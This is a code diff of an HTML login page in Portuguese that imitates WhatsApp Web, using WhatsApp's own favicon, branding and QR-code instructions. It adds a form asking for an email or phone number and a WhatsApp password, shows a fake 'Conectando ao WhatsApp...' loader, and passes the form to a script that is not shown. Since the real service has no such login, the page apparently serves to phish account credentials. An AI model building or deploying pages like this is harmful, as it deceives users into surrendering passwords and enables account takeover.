@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web - Login</title>
+    <title>WhatsApp Web</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="icon" href="https://web.whatsapp.com/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://web.whatsapp.com/favicon.ico">
 </head>
 <body>
     <div class="login-container">
@@ -20,89 +20,68 @@
                 <select>
                     <option value="pt">Português (BR)</option>
                     <option value="en">English</option>
-                    <option value="es">Español</option>
                 </select>
             </div>
         </header>
 
         <div class="login-wrapper">
-            <!-- Painel Esquerdo - QR Code -->
+            <!-- Painel QR Code -->
             <div class="qr-panel">
                 <div class="qr-container">
-                    <div class="qr-header">
-                        <h2>Use o WhatsApp no seu computador</h2>
-                    </div>
+                    <h2>Use o WhatsApp no seu computador</h2>
                     
                     <div class="qr-instructions">
                         <ol>
                             <li>Abra o WhatsApp no seu telefone</li>
-                            <li>Toque em <strong>Menu</strong> <i class="fas fa-ellipsis-v"></i> ou <strong>Configurações</strong> <i class="fas fa-cog"></i> e selecione <strong>Dispositivos conectados</strong></li>
+                            <li>Toque em <strong>Menu</strong> ou <strong>Configurações</strong></li>
+                            <li>Selecione <strong>Dispositivos conectados</strong></li>
                             <li>Toque em <strong>Conectar um dispositivo</strong></li>
-                            <li>Aponte seu telefone para esta tela para capturar o código</li>
+                            <li>Aponte seu telefone para esta tela</li>
                         </ol>
                     </div>
 
                     <div class="qr-code">
-                        <!-- QR Code de exemplo -->
-                        <div class="qr-image">
-                            <div class="qr-placeholder">
-                                <div class="qr-grid"></div>
-                                <div class="whatsapp-qr-icon">
-                                    <i class="fab fa-whatsapp"></i>
-                                </div>
-                            </div>
-                            <div class="qr-refresh">
-                                <button id="refreshQR">
-                                    <i class="fas fa-sync-alt"></i>
-                                    Atualizar código QR
-                                </button>
+                        <div class="qr-placeholder">
+                            <div class="qr-grid"></div>
+                            <div class="whatsapp-icon">
+                                <i class="fab fa-whatsapp"></i>
                             </div>
                         </div>
+                        <button class="refresh-btn" id="refreshQR">
+                            <i class="fas fa-sync-alt"></i>
+                            Atualizar código QR
+                        </button>
                     </div>
 
                     <div class="qr-help">
                         <a href="#">
                             <i class="fas fa-link"></i>
-                            Conectar com o número de telefone
+                            Conectar com número de telefone
                         </a>
                     </div>
                 </div>
             </div>
 
-            <!-- Painel Direito - Login por Email/Senha -->
+            <!-- Painel Login -->
             <div class="login-panel">
                 <div class="login-form-container">
-                    <div class="login-header-form">
-                        <h1>Entrar com Email</h1>
-                        <p class="subtitle">Use seu email e senha para acessar o WhatsApp Web</p>
-                    </div>
+                    <h1>Entrar com Email</h1>
+                    <p class="subtitle">Use seu email e senha do WhatsApp</p>
 
-                    <form id="loginForm" class="login-form">
+                    <form id="loginForm">
                         <div class="form-group">
-                            <label for="email">Email do WhatsApp</label>
+                            <label>Email ou número de telefone</label>
                             <div class="input-with-icon">
-                                <i class="fas fa-envelope"></i>
-                                <input 
-                                    type="email" 
-                                    id="email" 
-                                    placeholder="seu.email@exemplo.com"
-                                    required
-                                    autocomplete="email"
-                                >
+                                <i class="fas fa-user"></i>
+                                <input type="text" id="email" placeholder="email@exemplo.com" required>
                             </div>
                         </div>
 
                         <div class="form-group">
-                            <label for="password">Senha</label>
+                            <label>Senha</label>
                             <div class="input-with-icon">
                                 <i class="fas fa-lock"></i>
-                                <input 
-                                    type="password" 
-                                    id="password" 
-                                    placeholder="Digite sua senha"
-                                    required
-                                    autocomplete="current-password"
-                                >
+                                <input type="password" id="password" placeholder="Digite sua senha" required>
                                 <button type="button" class="show-password" id="showPassword">
                                     <i class="fas fa-eye"></i>
                                 </button>
@@ -117,72 +96,44 @@
                             <label for="remember">Manter-me conectado</label>
                         </div>
 
-                        <div class="form-actions">
-                            <button type="submit" class="btn-login">
-                                <i class="fab fa-whatsapp"></i>
-                                Entrar no WhatsApp
-                            </button>
-                        </div>
+                        <button type="submit" class="btn-login">
+                            <i class="fab fa-whatsapp"></i>
+                            Entrar no WhatsApp
+                        </button>
 
                         <div class="divider">
                             <span>ou</span>
                         </div>
 
-                        <div class="alternative-login">
-                            <button type="button" class="btn-alternative" id="usePhone">
-                                <i class="fas fa-mobile-alt"></i>
-                                Usar número de telefone
-                            </button>
-                            <button type="button" class="btn-alternative" id="useQR">
-                                <i class="fas fa-qrcode"></i>
-                                Usar código QR
-                            </button>
-                        </div>
+                        <button type="button" class="btn-alternative" id="useQR">
+                            <i class="fas fa-qrcode"></i>
+                            Usar código QR
+                        </button>
                     </form>
 
                     <div class="login-footer">
                         <p class="terms">
                             Ao entrar, você concorda com nossos 
-                            <a href="#">Termos de Serviço</a> e 
-                            <a href="#">Política de Privacidade</a>
+                            <a href="#">Termos</a> e <a href="#">Política de Privacidade</a>
                         </p>
-                        <div class="app-links">
-                            <p>Obtenha o aplicativo:</p>
-                            <div class="store-buttons">
-                                <a href="#">
-                                    <i class="fab fa-google-play"></i>
-                                    Google Play
-                                </a>
-                                <a href="#">
-                                    <i class="fab fa-app-store"></i>
-                                    App Store
-                                </a>
-                            </div>
-                        </div>
                     </div>
                 </div>
             </div>
         </div>
-
-        <!-- Modal para telefone (opcional) -->
-        <div class="modal" id="phoneModal">
-            <div class="modal-content">
-                <button class="modal-close">&times;</button>
-                <h3>Login com Telefone</h3>
-                <p>Em breve...</p>
-            </div>
-        </div>
     </div>
 
-    <!-- Carregando overlay -->
-    <div class="loading-overlay" id="loadingOverlay">
+    <!-- Loading -->
+    <div class="loading-overlay" id="loading">
         <div class="loading-content">
-            <div class="whatsapp-loading">
+            <div class="spinner">
                 <i class="fab fa-whatsapp"></i>
             </div>
             <p>Conectando ao WhatsApp...</p>
         </div>
     </div>
+
+    <!-- Notificação -->
+    <div class="notification" id="notification"></div>
 
     <script src="script.js"></script>
 </body>
